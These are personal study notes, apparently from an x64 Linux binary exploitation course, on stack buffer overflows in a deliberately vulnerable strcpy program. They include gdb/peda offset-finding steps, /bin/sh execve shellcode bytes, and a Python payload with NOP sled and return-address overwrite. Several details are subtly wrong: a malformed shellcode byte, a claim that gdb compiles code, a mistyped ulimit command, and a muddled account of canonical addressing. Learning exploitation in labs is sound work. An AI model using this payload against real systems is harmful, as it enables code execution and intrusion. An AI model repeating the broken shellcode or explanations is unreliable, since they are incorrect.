Resources used : https://www.youtube.com/watch?v=gxU3e7GbC-M : x64 Linux Binary Exploitation Training : Souce Meets Sink | https://www.theoffensivelabs.com/p/x64-linux-binary-exploitation-live-training 

So lets start with our basic BufferOverflow, I am using the code the course provided us with :
```c
#include<stdio.h> 
#include<string.h> 
void vuln_func(char *input); 

int main(int argc, char *argv[]){ 
	if(argc>1) 
	vuln_func(argv[1]); 
} 
	
void vuln_func(char *input){ 
	char buffer[256]; 
	strcpy(buffer, input); 
}
```
(This code was taken from the course, and is not written by me)

and then we can use gdb to compile the code for us without any protections. For most of our exploit development core files are very important as they have all the infromation about the dump for us and this is generated automatically when we get a segfault. If it doesnt generate automatically we can use :

```bash
ulimit -c unilimited
```

and then from this core file we can analyse whatever happened in the crash and we can analyse these core files using gdb like this :
```bash
gdb -core core
```

With 64bit we wont be by default see 4141414141 on RIP due to a concept called canonical bytes so with these exploits we usually overwrite the RBP and if thats overwritten thats all we need as out of the box.

We can load up binaries in GDB like so : 

```
gdb ./binary
```
Ideally you would also wanna do checksec on the binary but as we compiled it we know its alright and has no security enabled.

and then if we have a paylaod file with us we can use/pass our payload to it like this :

```
run $(cat payloadfile)
```

and ideally its a good Idea to also put a breakpoint at main to analyse the registers.
We can dissasmble and see assembly code of a function using the command `disas main` or `disas func`

Also break points are put using `b *address` and then you can continue `c`.

So we wont be able to overwrite the RIP as if you see the vmap of the binary we will see that out of the 64 bit only 48bits are used which is called canonical addressing so when you address a memory you can only use 48bit addresses but when we are overwriting it we are passing it a 8 byte (64 bits) addressing (non canonical) and the RIP wont accept it and these addresses are only used by the kernel and to pass a canonical byte to the RIP we need to get the offset of RBP and then using that information to overwrite the RIP with 6 bytes in the non-cononical addressing.

To get this offset we can use pattern_create which is a module in gdb-peda which is what i am using

```bash
gdb-peda> pattern_create 400 payload.txt
gdb-peda> run $(cat payload.txt)
```
after doing this with enough of a payload to crash a segfault and overwriting the RBP we can copy the value in RBP and use pattern_offset
```bash
gdb-peda> pattern_offset "RBPText"
```
and it will give us the exact offset to overwrite the RBP, now we can overwrite the RBP using the offset and supplying input for the RBP where we can use non-canonical addressing bytes(8 bytes) and then pass a canonical address (6 bytes) to overwrite the RIP with the 6bytes we passed like so :

```python

# Assuming offset is 128
padding = "A" * 128
rbpvalue = "B" * 8 # noncanonical addressing
ripvalue = "C" * 6 # canonical addressing
```

ret does pop rip which pops the value on the top of the stack to RIP. Here is some shellcode from the course that we can use :
```bash
\x48\x31\xc0\x48\x89\xc2\x48\x89\xd6\xd50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x48\x83\xc0\x3b\x0f\x05
```

Now we can use the shellcode and modify the pading and use some payloads to exploit this.

```python
offset = 128 
shellcode = "\x48\x31\xc0\x48\x89\xc2\x48\x89\xd6\xd50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x48\x83\xc0\x3b\x0f\x05"

nop = "\x90" * 12

offset = offset - len(shellcode) - len(nop)
padding = "A" * offset 
rbpvalue = "B" * 8 # noncanonical addressing
ripvalue = "C" * 6 # canonical addressing
payload = nop + shellcode + padding + rbpvalue + ripvalue
```

Now we need to find the address where our payload is stored using gdb and the x/50gx function and printing the stuff near $rsp and subtracting a little bit of padding we sent from it like this : 
```bash
x/50gx $rsp-140
```
but sometimes we wont get the exact same address in gdb that we will get while execute thats when we can use the core file and see where the address is and modify our exploit and then gg.

If the function is using a more vulnerable function like gets we can use instructions like JMP RSP , JMP RBX and point in our RIP and in the case JMP RSP we would need to have our shellcode right after the RIP as JMP RSP will jump to the top of the stack and our code whcih is directely after that will pop on to the top of the stack.

JMP RBX on the other hand would work only whethere shell code is in RBX and then we can use a fellow JMP RBX command and jump to that.
